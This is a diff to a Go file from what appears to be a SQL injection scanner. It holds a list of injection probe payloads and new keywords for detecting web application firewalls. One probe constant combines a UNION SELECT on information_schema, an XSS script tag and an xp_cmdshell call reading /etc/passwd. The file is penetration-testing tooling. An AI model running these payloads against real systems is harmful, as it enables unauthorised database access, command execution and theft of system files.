@@ -1,8 +1,8 @@
 package tools
 
-var payloads = []string {
-	"'", "')", "';", "\"", "\")","order by 5 %23--", "\";","--","-0",") AND 1998=1532 AND (5526=5526",
-	" AND 5434=5692%23"," %' AND 5268=2356 AND '%'='"," ') AND 6103=4103 AND ('vPKl'='vPKl"," ' AND 7738=8291 AND 'UFqV'='UFqV",
+var payloads = []string{
+	"'", "')", "';", "\"", "\")", "order by 5 %23--", "\";", "--", "-0", ") AND 1998=1532 AND (5526=5526",
+	" AND 5434=5692%23", " %' AND 5268=2356 AND '%'='", " ') AND 6103=4103 AND ('vPKl'='vPKl", " ' AND 7738=8291 AND 'UFqV'='UFqV",
 	"`", "`)", "`;", "\\\\", "%27", "%%2727", "%25%27", "%60", "%5C"}
 
 var FORMAT_EXCEPTION_STRINGS = []string{"Type mismatch",
@@ -16,8 +16,13 @@ var FORMAT_EXCEPTION_STRINGS = []string{"Type mismatch",
 	"InvalidDataException", "Arguments are of the wrong type"}
 
 var HEURISTIC_CHECK_ALPHABET = "\"',)(."
+
 // query 请求连接符
 var DEFAULT_GET_POST_DELIMITER = '&'
+
+// check waf
+var WAF_CHECK_KEYWORD = []string{"造成安全威胁", "Bot-Block-ID", "您访问IP已被管理员限制", "本次事件ID", "当前访问疑似黑客攻击",
+	"safedog", "拦截", "ValidateInputIfRequiredByConfig", "You don't have permission to access", "location.href"}
 
 const IPS_WAF_CHECK_PAYLOAD = "1 AND 1=1 UNION ALL SELECT 1,NULL,'<script>alert(\"XSS\")</script>',table_name FROM information_schema.tables WHERE 2>1--/**/; EXEC xp_cmdshell('cat ../../../etc/passwd')#"
 
@@ -30,7 +35,6 @@ var GENERIC_PROTECTION_KEYWORDS = []string{}
 //RANDSTR1# 随机字符串 4字节后面修改
 //RANDSTR2# 同上
 //ORIGINAL# 获取url中的传递参数值
-
 
 //var pre_suf = {
 //'pre_suf_1': {'prefix': ')',
@@ -261,4 +265,3 @@ var GENERIC_PROTECTION_KEYWORDS = []string{}
 //'pre_suf_77': {'prefix': "' IN BOOLEAN MODE)",
 //'suffix': '#'}
 //}
-
